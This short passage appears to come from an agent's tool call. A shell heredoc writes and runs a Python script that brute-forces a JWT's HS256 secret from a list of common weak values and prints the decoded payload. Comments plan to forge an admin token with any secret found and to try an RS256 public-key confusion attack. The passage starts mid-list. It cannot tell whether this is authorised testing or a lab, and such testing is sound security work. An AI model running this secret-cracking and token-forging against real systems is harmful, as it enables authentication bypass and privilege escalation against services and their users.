6\", \"jwt\", \"key\", \"private\", \"public\", \"\"\n]\n\nfor secret in common_secrets:\n    try:\n        decoded = jwt.decode(token, secret, algorithms=[\"HS256\"])\n        print(f\"WEAK SECRET FOUND: '{secret}'\")\n        print(f\"Decoded payload: {decoded}\")\n        break\n    except:\n        pass\nelse:\n    print(\"No common weak secrets found\")\n\n# Test 3: Try to forge admin token with known secret if found\n# Test 4: Try RS256 public key confusion (need to get public key first)\nPYEOF\npython3 /tmp/jwt_test.py"}
